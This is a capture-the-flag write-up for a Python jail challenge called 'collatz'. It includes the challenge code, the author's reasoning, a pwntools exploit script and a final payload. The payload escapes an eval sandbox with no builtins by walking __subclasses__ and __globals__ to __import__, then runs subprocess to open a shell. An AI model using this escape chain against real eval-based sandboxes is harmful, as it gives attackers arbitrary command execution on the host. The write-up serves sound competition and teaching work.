# collatz

Challenge:

```python
#!/usr/local/bin/python3
import re

def collatz(num):
    while num != 1:
        yield num
        if num % 2:
            num = num * 3 + 1
        else:
            num = num // 2
    yield 1

code = input("code > ")
gen = collatz(int(input("starting num > "), 0))

if not code.isascii() or len(code) >= 400:
    print("You can't do that")
    exit(1)

for m in re.findall(r"\w+", code):
    try:
        expected_len = next(gen)
    except StopIteration:
        print("You're out of lengths!")
        exit(2)
    
    if len(m) != expected_len:
        print("Length mismatch")
        exit(3)

eval(code, {'__builtins__': {}})
```

Similar to [increasing](../misc/pyjail/secconctf-14-final-increasing.md) and [primal](../misc/pyjail/jailctf-2025-primal.md), we need to make the `\w+` words to conform to some requirements. Here, its length should be a collatz sequence. First, we collect the common words that need to be used for identifiers:

```python
# __new__: 7
# __mro__: 7
# __init__: 8
# __base__: 8
# builtins: 8
# __class__: 9
# breakpoint: 10
# __import__: 10
# __setattr__: 11
# __globals__: 11
# __builtins__: 12
# __objclass__: 12
# __reduce_ex__: 13
# __subclasses__: 14
# __getattribute__: 16
```

We can find a long collatz sequence that covers commonly used `__class__`, `__subclasses__`, etc:

```python
9 -> 28 -> 14 -> 7 -> 22 -> 11 -> 34 -> 17 -> 52 -> 26 -> 13 -> 40 -> 20 -> 10 -> 5 -> 16 -> 8 -> 4 -> 2 -> 1
```

So we need to start from `__class__`(9), then `__subclasses__`(14), then we need to recover builtins from `__new__`(7) and `__globals__`(11). Then, we need to finish the chain as fast as possible.

Since we can only start from `().__class__`, find a way to builtins by:

```python
classes = ().__class__.__subclasses__()
for i, c in enumerate(classes):
    try:
        print(i, c, c.__new__.__globals__.keys())
    except:
        pass
```

We found the `().__class__.__subclasses__()[17]` contains `builtins` for us! Next, we can get `__import__` from `__builtins__` dict via string, and we have to stop early. After extensive search, `subprocess.check_call('rbash')` can stop early enough: `check_call` is 10 bytes, while `rbash` is 5 bytes.

Then, we can use string tricks to compute the strings we need, e.g. `"__builtins__{padding}"[:0x{12:015x}]`, so we can have lengths of 34 and 17. When we don't want to change the value but generate a new word of some length, we can use `[value][00000.0000]`. For numbers, use the old trick of `-~-~...(()==())` with shift to reduce length.

The final exploit code:

```python
from pwn import *

context(log_level="debug")


def wrap(s, len):
    zero = "0".zfill(len)
    return f"[{s}][{zero}]"


num_1 = "(()==())"
num_2 = "-~(()==())"
num_4 = "-~" * 3 + "(()==())"
num_17 = f"-~(({num_1})<<({num_4}))"
# 9 -> 28
code = wrap("().__class__", 28)
# -> 14 -> 7
code = f"{code}.__subclasses__()[{num_17}].__new__"
# -> 22
code = wrap(code, 22)
# -> 11 -> 34 -> 17
padding = "0" * 22
code = f'{code}.__globals__["__builtins__{padding}"[:0x{12:015x}]]'
# -> 52 -> 26
padding2 = "0" * 42
code = f'{code}["__import__{padding2}"[:0x{10:024x}]]'
# -> 13 -> 40
padding3 = "0" * 3
code = f'{code}("subprocess{padding3}"[:0x{10:038x}])'
# -> 20 -> 10 -> 5
code = wrap(code, 20)
padding4 = "0" * 3
code = f"{code}.check_call('rbash')"
print(code)

p = remote("challs.pyjail.club", port=18858)
p.recvuntil(b"code >")
p.sendline(code.encode())
p.recvuntil(b"starting num >")
p.sendline("9".encode())
p.interactive()
```

The payload is 388 bytes:

```python
[[[().__class__][0000000000000000000000000000].__subclasses__()[-~(((()==()))<<(-~-~-~(()==())))].__new__][0000000000000000000000].__globals__["__builtins__0000000000000000000000"[:0x00000000000000c]]["__import__000000000000000000000000000000000000000000"[:0x00000000000000000000000a]]("subprocess000"[:0x0000000000000000000000000000000000000a])][00000000000000000000].check_call('rbash')
```

Then, get flag by running bash and then the provided excutable. Flag: `jail{is_it_time_to_retire_this_format????}`.

Attempts failed due to length requirements:

- `__globals__["builtins"]`: require a literal later
- `code.interact()`: the last length is 8, too long
